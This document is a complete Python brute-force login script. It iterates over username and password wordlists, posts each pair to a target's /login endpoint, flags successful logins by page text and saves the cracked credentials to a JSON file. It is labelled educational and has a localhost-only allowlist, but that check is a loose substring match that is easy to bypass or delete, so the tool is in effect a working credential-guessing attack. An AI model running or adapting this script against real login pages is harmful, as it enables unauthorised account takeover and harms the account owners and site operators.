import requests
import sys
import time
import json
from colorama import init, Fore, Style
import argparse


init(autoreset=True)


def print_colored_help():
    print()
    print(f"{Fore.CYAN}Brute-force Login Script {Fore.RED}(FOR EDUCATIONAL USE ONLY){Style.RESET_ALL}\n")
    print(f"{Fore.YELLOW}Usage:{Style.RESET_ALL} python3 brute.py {Fore.GREEN}<target>{Style.RESET_ALL} "
          f"{Fore.MAGENTA}<usernames_file>{Style.RESET_ALL} {Fore.BLUE}<password_file>{Style.RESET_ALL}\n")
    print(f"{Fore.CYAN}Arguments:{Style.RESET_ALL}")
    print(f"  {Fore.GREEN}target{Style.RESET_ALL}           Target URL (must be http://127.0.0.1:5000 or http://localhost:5000)")
    print(f"  {Fore.MAGENTA}usernames_file{Style.RESET_ALL}   Usernames file (e.g., username.txt)")
    print(f"  {Fore.BLUE}password_file{Style.RESET_ALL}    Passwords file (e.g., pass.txt)\n")
    print(f"{Fore.YELLOW}Authorized targets:{Style.RESET_ALL}")
    print("  - http://127.0.0.1:5000\n  - http://localhost:5000\n")
    print(f"{Fore.RED}This script will refuse to run on other sites for your safety and to comply with ethical guidelines.{Style.RESET_ALL}\n")


def main():
    allowed_targets = ["127.0.0.1", "localhost"]

    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument("target", nargs="?", help="Target URL")
    parser.add_argument("usernames_file", nargs="?", help="Usernames file")
    parser.add_argument("password_file", nargs="?", help="Passwords file")
    parser.add_argument("-h", "--help", action="store_true", help="Show help message and exit")
    args = parser.parse_args()

    if args.help or not (args.target and args.usernames_file and args.password_file):
        print_colored_help()
        sys.exit(0)

    if not any(site in args.target for site in allowed_targets):
        print(f"{Fore.RED}[!] Only authorized targets allowed!")
        print("Permitted: http://127.0.0.1:5000, http://localhost:5000")
        print("Use -h or --help to see more info.\nExiting now for your safety." + Style.RESET_ALL)
        sys.exit(1)

    try:
        with open(args.usernames_file, "r") as f:
            usernames = [line.strip() for line in f if line.strip()]
        with open(args.password_file, "r") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except IOError as e:
        print(f"{Fore.RED}[!] Error reading file: {e}{Style.RESET_ALL}")
        sys.exit(1)

    session = requests.Session()
    success_html = "Successfully Logged In"
    results = []
    found_any = False

    for username in usernames:
        user_found = False
        for password in passwords:
            data = {"username": username, "password": password}
            try:
                r = session.post(args.target.rstrip("/") + "/login", data=data, timeout=5, allow_redirects=True)
                
                print(f"{Fore.YELLOW}[>] Attempting {username}:{password}{Style.RESET_ALL}")

                if success_html.lower() in r.text.lower():
                    print(f"{Fore.GREEN}\t[+] Valid password '{password}' found for user '{username}'!{Style.RESET_ALL}")
                    results.append({"username": username, "password": password})
                    user_found = True
                    found_any = True
                    break

            except requests.ConnectionError:
                print(f"{Fore.RED}[!] Error: Unable to connect to {args.target}. The website may be down or unreachable.{Style.RESET_ALL}")
                sys.exit(1)
            except requests.Timeout:
                print(f"{Fore.RED}[!] Error: Request to {args.target} timed out.{Style.RESET_ALL}")
                sys.exit(1)
            except requests.RequestException as e:
                print(f"{Fore.RED}[!] Connection error: {e}{Style.RESET_ALL}")
                sys.exit(1)

            time.sleep(0.5)

        if not user_found:
            print(f"{Fore.RED}\t[-] No valid password found for user '{username}'{Style.RESET_ALL}")

    if found_any:
        with open("results.json", "w") as f:
            json.dump(results, f, indent=4)
        print()
        print(f"{Fore.CYAN}Results saved to results.json{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}No valid user:password combinations found.{Style.RESET_ALL}")


if __name__ == "__main__":
    main()
